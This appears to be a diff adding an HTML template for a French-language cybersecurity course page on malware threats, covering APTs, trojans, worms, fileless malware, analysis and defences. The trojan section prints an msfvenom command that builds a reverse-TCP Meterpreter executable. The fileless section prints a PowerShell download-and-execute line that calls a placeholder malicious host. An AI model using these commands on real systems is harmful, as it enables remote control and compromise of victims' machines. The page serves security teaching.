@@ -1,0 +1,740 @@
+{% extends "base.html" %}
+
+{% block title %}Cours - Module Malware Threats{% endblock %}
+
+{% block content %}
+
+<div class="container mt-4">
+    <h1>Cours - Module: Malware Threats</h1>
+    
+    <!-- Table des matières -->
+    <table class="table table-bordered table-of-contents">
+        <thead>
+            <tr>
+                <th>Section</th>
+                <th>Description</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><a href="#malware-concepts">1. Concepts des malwares</a></td>
+                <td>Fondamentaux et classification des malwares</td>
+            </tr>
+            <tr>
+                <td><a href="#apt-concepts">2. Concepts APT</a></td>
+                <td>Menaces persistantes avancées</td>
+            </tr>
+            <tr>
+                <td><a href="#trojan-concepts">3. Concepts des chevaux de Troie</a></td>
+                <td>Trojan, backdoors et RATs</td>
+            </tr>
+            <tr>
+                <td><a href="#virus-worm-concepts">4. Virus et vers informatiques</a></td>
+                <td>Différences et mécanismes de propagation</td>
+            </tr>
+            <tr>
+                <td><a href="#fileless-malware">5. Malwares sans fichier</a></td>
+                <td>Techniques furtives et détection</td>
+            </tr>
+            <tr>
+                <td><a href="#malware-analysis">6. Analyse des malwares</a></td>
+                <td>Techniques statiques et dynamiques</td>
+            </tr>
+            <tr>
+                <td><a href="#countermeasures">7. Contre-mesures</a></td>
+                <td>Protections contre les malwares</td>
+            </tr>
+            <tr>
+                <td><a href="#anti-malware">8. Logiciels anti-malware</a></td>
+                <td>Solutions de protection commerciales</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- Sections de contenu -->
+    
+    <section id="malware-concepts">
+        <h1>1. Concepts des malwares</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Qu'est-ce qu'un malware?</h3>
+                <p>Un malware (logiciel malveillant) est un programme conçu pour:</p>
+                <ul>
+                    <li>Endommager ou perturber des systèmes</li>
+                    <li>Voler des données sensibles</li>
+                    <li>Contourner les contrôles d'accès</li>
+                    <li>Prendre le contrôle de machines</li>
+                    <li>Envoyer des spams ou mener des attaques DDoS</li>
+                </ul>
+                
+                <h3>Classification des malwares</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <td><strong>Type</strong></td>
+                        <td><strong>Description</strong></td>
+                    </tr>
+                    <tr>
+                        <td>Virus</td>
+                        <td>Se réplique en infectant d'autres fichiers</td>
+                    </tr>
+                    <tr>
+                        <td>Ver</td>
+                        <td>Se propage via le réseau sans hôte</td>
+                    </tr>
+                    <tr>
+                        <td>Cheval de Troie</td>
+                        <td>Logiciel légitime contenant du code malveillant</td>
+                    </tr>
+                    <tr>
+                        <td>Ransomware</td>
+                        <td>Chiffre les données et demande une rançon</td>
+                    </tr>
+                    <tr>
+                        <td>Spyware</td>
+                        <td>Collecte des informations à l'insu de l'utilisateur</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-light p-3">
+                    <h4>Évolution des malwares</h4>
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <div class="timeline-year">1986</div>
+                            <div class="timeline-content">Brain (premier virus PC)</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-year">1999</div>
+                            <div class="timeline-content">Melissa (virus par email)</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-year">2003</div>
+                            <div class="timeline-content">SQL Slammer (ver réseau)</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-year">2013</div>
+                            <div class="timeline-content">CryptoLocker (ransomware)</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-year">2020</div>
+                            <div class="timeline-content">Emotet (malware modulaire)</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card bg-danger text-white mt-3">
+                    <div class="card-body">
+                        <h4>Statistiques clés</h4>
+                        <ul>
+                            <li>560 000 nouveaux malwares détectés chaque jour</li>
+                            <li>Ransomware: augmentation de 150% en 2023</li>
+                            <li>Coût moyen d'une attaque ransomware: $4.5M</li>
+                            <li>95% des violations impliquent un malware</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="apt-concepts" class="mt-5">
+        <h1>2. Concepts APT (Advanced Persistent Threat)</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Caractéristiques des APT</h3>
+                <ul>
+                    <li><strong>Avancées</strong>: Techniques sophistiquées et ciblées</li>
+                    <li><strong>Persistantes</strong>: Opérations continues sur de longues périodes</li>
+                    <li><strong>Menaces</strong>: Acteurs motivés (États-nations, cybercriminels)</li>
+                </ul>
+                
+                <h3>Cycle de vie d'une APT</h3>
+                <ol>
+                    <li>Reconnaissance</li>
+                    <li>Initial Intrusion</li>
+                    <li>Établissement de persistance</li>
+                    <li>Élévation de privilèges</li>
+                    <li>Mouvement latéral</li>
+                    <li>Exfiltration de données</li>
+                    <li>Maintien de l'accès</li>
+                </ol>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-warning text-dark p-3">
+                    <h4>Groupes APT notables</h4>
+                    <table class="table table-sm">
+                        <tr>
+                            <td><strong>APT28</strong></td>
+                            <td>Fancy Bear (Russie)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>APT29</strong></td>
+                            <td>Cozy Bear (Russie)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>APT34</strong></td>
+                            <td>OilRig (Iran)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>APT40</strong></td>
+                            <td>Leviathan (Chine)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Lazarus</strong></td>
+                            <td>Group (Corée du Nord)</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-body">
+                        <h5>Exemple: APT28 (Fancy Bear)</h5>
+                        <ul>
+                            <li>Cible: Gouvernements, militaires, organisations politiques</li>
+                            <li>Tactiques: Spear phishing, exploits zero-day</li>
+                            <li>Malwares: Sofacy, X-Agent</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="mt-4">
+            <h3>Indicateurs de compromission (IoC)</h3>
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header bg-primary text-white">Fichiers</div>
+                        <div class="card-body">
+                            <p>Hashes, noms de fichiers, signatures</p>
+                            <code>MD5: 098f6bcd4621d373cade4e832627b4f6</code>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header bg-success text-white">Réseau</div>
+                        <div class="card-body">
+                            <p>Domaines, IPs, URLs</p>
+                            <code>malicious-domain[.]com</code>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header bg-danger text-white">Comportement</div>
+                        <div class="card-body">
+                            <p>Mutex, clés de registre, scripts</p>
+                            <code>HKLM\Software\MaliciousKey</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="trojan-concepts" class="mt-5">
+        <h1>3. Concepts des chevaux de Troie</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Fonctionnement des Trojans</h3>
+                <div class="text-center mb-3">
+                    <img src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2020/02/Trojan-Horse-1.jpg" alt="Fonctionnement Trojan" class="img-fluid rounded">
+                </div>
+                <ol>
+                    <li>L'utilisateur exécute un fichier apparemment légitime</li>
+                    <li>Le code malveillant est chargé en mémoire</li>
+                    <li>Connexion à un serveur C2 (Command & Control)</li>
+                    <li>Exécution des commandes à distance</li>
+                </ol>
+                
+                <h3>Types de Trojans</h3>
+                <ul>
+                    <li><strong>Backdoor</strong>: Accès administrateur à distance</li>
+                    <li><strong>Banker</strong>: Vol d'identifiants bancaires</li>
+                    <li><strong>DDoS</strong>: Lancement d'attaques par déni de service</li>
+                    <li><strong>Downloader</strong>: Télécharge d'autres malwares</li>
+                    <li><strong>RAT</strong>: Remote Access Trojan (contrôle total)</li>
+                </ul>
+            </div>
+            
+            <div class="col-md-6">
+                <h3>Techniques d'obfuscation</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li><strong>Packers</strong>: UPX, Themida, VMProtect</li>
+                        <li><strong>Chiffrement</strong>: AES, RC4, chiffrement personnalisé</li>
+                        <li><strong>Polymorphisme</strong>: Changement de signature à chaque exécution</li>
+                        <li><strong>Métamorphisme</strong>: Réécriture complète du code</li>
+                        <li><strong>Anti-debugging</strong>: Détection des environnements d'analyse</li>
+                    </ul>
+                </div>
+                
+                <div class="card bg-danger text-white mt-3">
+                    <div class="card-header">
+                        <h4>Exemples de Trojans célèbres</h4>
+                    </div>
+                    <div class="card-body">
+                        <table class="table table-dark">
+                            <tr>
+                                <td><strong>Zeus</strong></td>
+                                <td>Spyware bancaire, créé en 2007</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Emotet</strong></td>
+                                <td>Trojan modulaire, distribué via spam</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Gh0st RAT</strong></td>
+                                <td>RAT utilisé par des groupes APT</td>
+                            </tr>
+                            <tr>
+                                <td><strong>DarkComet</strong></td>
+                                <td>RAT avec fonctionnalités de surveillance</td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-body">
+                        <h5>Création d'un Trojan simple</h5>
+                        <pre class="bg-dark text-light p-3">
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > trojan.exe</pre>
+                        <p>Ce payload créé un exécutable qui établit une connexion reverse TCP vers l'attaquant.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="virus-worm-concepts" class="mt-5">
+        <h1>4. Virus et vers informatiques</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Virus informatiques</h3>
+                <div class="card bg-light p-3 mb-3">
+                    <p>Caractéristiques principales:</p>
+                    <ul>
+                        <li>Nécessite un programme hôte pour s'exécuter</li>
+                        <li>Se réplique en infectant d'autres fichiers</li>
+                        <li>Charge utile souvent destructive</li>
+                        <li>Méthodes d'infection: macros, secteur de boot, fichiers exécutables</li>
+                    </ul>
+                </div>
+                
+                <h4>Types de virus</h4>
+                <table class="table table-bordered">
+                    <tr>
+                        <td><strong>Type</strong></td>
+                        <td><strong>Description</strong></td>
+                    </tr>
+                    <tr>
+                        <td>Virus de fichier</td>
+                        <td>Infecte les fichiers exécutables (.exe, .dll)</td>
+                    </tr>
+                    <tr>
+                        <td>Virus de macro</td>
+                        <td>Infecte les documents Word, Excel</td>
+                    </tr>
+                    <tr>
+                        <td>Virus de boot</td>
+                        <td>Infecte le secteur de démarrage</td>
+                    </tr>
+                    <tr>
+                        <td>Virus polymorphe</td>
+                        <td>Change son code à chaque infection</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <div class="col-md-6">
+                <h3>Vers informatiques</h3>
+                <div class="card bg-light p-3 mb-3">
+                    <p>Caractéristiques principales:</p>
+                    <ul>
+                        <li>Autonome, ne nécessite pas d'hôte</li>
+                        <li>Se propage via le réseau sans intervention</li>
+                        <li>Exploite des vulnérabilités logicielles</li>
+                        <li>Peut se propager très rapidement</li>
+                    </ul>
+                </div>
+                
+                <h4>Vers célèbres</h4>
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <table class="table table-borderless text-white">
+                            <tr>
+                                <td><strong>Morris</strong> (1988)</td>
+                                <td>Premier ver internet, infecta 10% des machines connectées</td>
+                            </tr>
+                            <tr>
+                                <td><strong>ILOVEYOU</strong> (2000)</td>
+                                <td>Ver par email, dégâts estimés à $15 milliards</td>
+                            </tr>
+                            <tr>
+                                <td><strong>WannaCry</strong> (2017)</td>
+                                <td>Ver ransomware exploitant EternalBlue</td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="mt-4">
+            <h3>Différences clés</h3>
+            <table class="table table-bordered">
+                <thead class="table-dark">
+                    <tr>
+                        <th>Caractéristique</th>
+                        <th>Virus</th>
+                        <th>Ver</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Hôte requis</td>
+                        <td>Oui</td>
+                        <td>Non</td>
+                    </tr>
+                    <tr>
+                        <td>Propagation</td>
+                        <td>Fichiers</td>
+                        <td>Réseau</td>
+                    </tr>
+                    <tr>
+                        <td>Vitesse de propagation</td>
+                        <td>Lente</td>
+                        <td>Rapide</td>
+                    </tr>
+                    <tr>
+                        <td>Détection</td>
+                        <td>Relativement facile</td>
+                        <td>Difficile</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+    
+    <section id="fileless-malware" class="mt-5">
+        <h1>5. Malwares sans fichier (Fileless Malware)</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Caractéristiques</h3>
+                <ul>
+                    <li>Aucun fichier écrit sur le disque</li>
+                    <li>Exécution en mémoire uniquement</li>
+                    <li>Utilisation d'outils légitimes (Living-off-the-land)</li>
+                    <li>Très difficile à détecter</li>
+                    <li>Persistance via registre, WMI, tâches planifiées</li>
+                </ul>
+                
+                <h3>Techniques d'attaque</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <td><strong>Technique</strong></td>
+                        <td><strong>Description</strong></td>
+                    </tr>
+                    <tr>
+                        <td>PowerShell Attack</td>
+                        <td>Utilisation de scripts PowerShell malveillants</td>
+                    </tr>
+                    <tr>
+                        <td>WMI Persistence</td>
+                        <td>Utilisation de WMI pour persister</td>
+                    </tr>
+                    <tr>
+                        <td>Registry Resident</td>
+                        <td>Stockage du payload dans le registre</td>
+                    </tr>
+                    <tr>
+                        <td>Memory Injection</td>
+                        <td>Injection dans des processus légitimes</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-light p-3">
+                    <h4>Exemple: Attaque PowerShell</h4>
+                    <pre class="bg-dark text-light p-3">
+# Téléchargement et exécution en mémoire
+IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')
+
+# Injection dans un processus légitime
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234</pre>
+                </div>
+                
+                <div class="card bg-warning text-dark mt-3">
+                    <div class="card-body">
+                        <h4>Malwares sans fichier notables</h4>
+                        <ul>
+                            <li><strong>PowerGhost</strong>: Mineur de cryptomonnaie</li>
+                            <li><strong>Kovter</strong>: Clicker frauduleux</li>
+                            <li><strong>Duqu 2.0</strong>: Malware APT</li>
+                            <li><strong>FIN7</strong>: Groupe utilisant des malwares sans fichier</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="mt-4">
+            <h3>Détection des malwares sans fichier</h3>
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header bg-primary text-white">Analyse mémoire</div>
+                        <div class="card-body">
+                            <p>Outils: Volatility, Rekall</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header bg-success text-white">Logs PowerShell</div>
+                        <div class="card-body">
+                            <p>Activer la journalisation ModuleScriptBlock</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header bg-danger text-white">Analyse comportementale</div>
+                        <div class="card-body">
+                            <p>Détection d'anomalies dans les processus</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="malware-analysis" class="mt-5">
+        <h1>6. Analyse des malwares</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Analyse statique</h3>
+                <p>Examen du malware sans l'exécuter</p>
+                <ul>
+                    <li><strong>Analyse de chaînes</strong>: Strings, FLOSS</li>
+                    <li><strong>Désassemblage</strong>: IDA Pro, Ghidra</li>
+                    <li><strong>Analyse de headers</strong>: PE Explorer</li>
+                    <li><strong>Hashes</strong>: MD5, SHA1, SHA256</li>
+                    <li><strong>Détection de packers</strong>: PEiD, Exeinfo PE</li>
+                </ul>
+                
+                <div class="card bg-light p-3 mt-3">
+                    <h5>Workflow d'analyse statique</h5>
+                    <ol>
+                        <li>Calculer les hashes</li>
+                        <li>Identifier le type de fichier</li>
+                        <li>Extraire les chaînes lisibles</li>
+                        <li>Analyser les imports API</li>
+                        <li>Désassembler le code</li>
+                    </ol>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <h3>Analyse dynamique</h3>
+                <p>Exécution contrôlée du malware</p>
+                <ul>
+                    <li><strong>Sandbox</strong>: Cuckoo, Any.Run</li>
+                    <li><strong>Debugging</strong>: x64dbg, WinDbg</li>
+                    <li><strong>Monitoring</strong>: Process Monitor, Wireshark</li>
+                    <li><strong>Analyse mémoire</strong>: Volatility</li>
+                </ul>
+                
+                <div class="card bg-light p-3 mt-3">
+                    <h5>Workflow d'analyse dynamique</h5>
+                    <ol>
+                        <li>Configurer l'environnement isolé</li>
+                        <li>Capturer un instantané système</li>
+                        <li>Exécuter le malware</li>
+                        <li>Surveiller les changements système</li>
+                        <li>Analyser le trafic réseau</li>
+                        <li>Dumper et analyser la mémoire</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+        
+        <div class="mt-4">
+            <h3>Environnements d'analyse</h3>
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5>Réel</h5>
+                            <p>+ Comportement réel<br>- Risque d'infection</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5>Virtualisé</h5>
+                            <p>+ Isolation facile<br>- Détection possible</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5>Émulation</h5>
+                            <p>+ Sécurité maximale<br>- Limitation des fonctionnalités</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="countermeasures" class="mt-5">
+        <h1>7. Contre-mesures</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Stratégies de protection</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li><strong>Défense en profondeur</strong>: Multiples couches de sécurité</li>
+                        <li><strong>Principle of Least Privilege</strong>: Accès minimum requis</li>
+                        <li><strong>Whitelisting</strong>: Autorisation explicite des applications</li>
+                        <li><strong>Mises à jour</strong>: Correction rapide des vulnérabilités</li>
+                        <li><strong>Formation utilisateurs</strong>: Reconnaissance des menaces</li>
+                    </ul>
+                </div>
+                
+                <h3 class="mt-4">Protection contre les ransomwares</h3>
+                <ul>
+                    <li>Sauvegardes régulières (règle 3-2-1)</li>
+                    <li>Restaurations régulières de test</li>
+                    <li>Segmentation réseau</li>
+                    <li>Désactivation des macros</li>
+                    <li>Limitation des droits administrateur</li>
+                </ul>
+            </div>
+            
+            <div class="col-md-6">
+                <h3>Détection avancée</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li><strong>EDR</strong>: Endpoint Detection and Response</li>
+                        <li><strong>SIEM</strong>: Corrélation des logs et alertes</li>
+                        <li><strong>Sandboxing</strong>: Analyse des fichiers suspects</li>
+                        <li><strong>Analyse comportementale</strong>: Détection des anomalies</li>
+                        <li><strong>Threat Intelligence</strong>: Utilisation des IoC</li>
+                    </ul>
+                </div>
+                
+                <div class="card bg-success text-white mt-3">
+                    <div class="card-body">
+                        <h4>Réponse aux incidents</h4>
+                        <ol>
+                            <li>Isoler les systèmes infectés</li>
+                            <li>Identifier le vecteur d'infection</li>
+                            <li>Collecter les preuves</li>
+                            <li>Éradiquer la menace</li>
+                            <li>Restaurer les systèmes</li>
+                            <li>Analyser les causes profondes</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="anti-malware" class="mt-5">
+        <h1>8. Logiciels anti-malware</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Solutions commerciales</h3>
+                <table class="table table-bordered">
+                    <thead class="table-dark">
+                        <tr>
+                            <th>Solution</th>
+                            <th>Points forts</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Bitdefender GravityZone</td>
+                            <td>Protection multicouche, faible impact</td>
+                        </tr>
+                        <tr>
+                            <td>Kaspersky Endpoint Security</td>
+                            <td>Détection comportementale avancée</td>
+                        </tr>
+                        <tr>
+                            <td>Symantec Endpoint Protection</td>
+                            <td>Protection contre les menaces avancées</td>
+                        </tr>
+                        <tr>
+                            <td>CrowdStrike Falcon</td>
+                            <td>Plateforme EDR basée sur le cloud</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft Defender for Endpoint</td>
+                            <td>Intégration avec l'écosystème Microsoft</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="col-md-6">
+                <h3>Solutions open source</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li><strong>ClamAV</strong>: Antivirus open source</li>
+                        <li><strong>OSSEC</strong>: Système de détection d'intrusion</li>
+                        <li><strong>Wazuh</strong>: Plateforme de sécurité unifiée</li>
+                        <li><strong>YARA</strong>: Outil d'identification de malwares</li>
+                        <li><strong>Cuckoo Sandbox</strong>: Analyse de malwares</li>
+                    </ul>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-primary text-white">
+                        <h4>Évaluation des solutions AV</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li><strong>Taux de détection</strong>: Capacité à identifier les menaces</li>
+                            <li><strong>Performance</strong>: Impact sur les ressources système</li>
+                            <li><strong>Taux de faux positifs</strong>: Erreurs de classification</li>
+                            <li><strong>Fonctionnalités</strong>: Protection en temps réel, analyse heuristique</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card bg-info text-white mt-4">
+            <div class="card-body">
+                <h4>Recommandations CEHv13</h4>
+                <ol>
+                    <li>Implémenter une solution EDR complète</li>
+                    <li>Mettre à jour régulièrement les signatures</li>
+                    <li>Activer le cloud scanning</li>
+                    <li>Configurer des analyses heuristiques approfondies</li>
+                    <li>Effectuer des tests de pénétration réguliers</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+</div>
+
+{% endblock %}
